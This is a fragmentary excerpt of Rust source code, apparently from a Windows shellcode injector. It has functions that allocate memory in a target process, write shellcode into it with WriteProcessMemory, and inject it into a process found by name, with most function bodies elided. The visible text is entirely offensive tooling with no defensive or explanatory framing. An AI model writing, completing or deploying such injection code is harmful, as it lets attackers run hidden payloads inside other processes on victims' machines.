...
fn allocate_memory_in_target(process_handle: HANDLE, size: usize) -> Option<*mut core::ffi::c_void> {
    unsafe {
...
fn write_shellcode_to_memory(process_handle: HANDLE, remote_memory: *mut core::ffi::c_void, shellcode: &[u8]) -> bool {
    unsafe {
        WriteProcessMemory(
            process_handle,
...
pub fn inject_shellcode_to_target_process(target_name: &str, shellcode: &[u8]) {
    // Find target process
    let (process_handle, _) = find_process(target_name)
